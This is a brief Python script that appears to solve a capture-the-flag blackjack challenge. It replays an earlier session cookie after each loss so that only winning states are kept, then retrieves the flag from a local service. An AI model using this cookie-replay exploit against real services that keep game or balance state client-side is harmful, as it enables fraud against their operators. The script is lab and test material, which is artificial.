import requests
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "14001")

URL = "http://{host}:{port}/".format(host=HOST, port=PORT)

r = requests.post(URL + "/initialize")
cookie = r.cookies["matsushima"]
chip = 100

while chip < 999999:
    r = requests.post(URL + "/stand", cookies={
        "matsushima": cookie,
    })
    if r.json()["chip"] != 0:
        cookie = r.cookies["matsushima"]
        chip = chip * 2
r = requests.get(URL + "/flag", cookies={"matsushima": cookie})
print(r.json()["flag"])


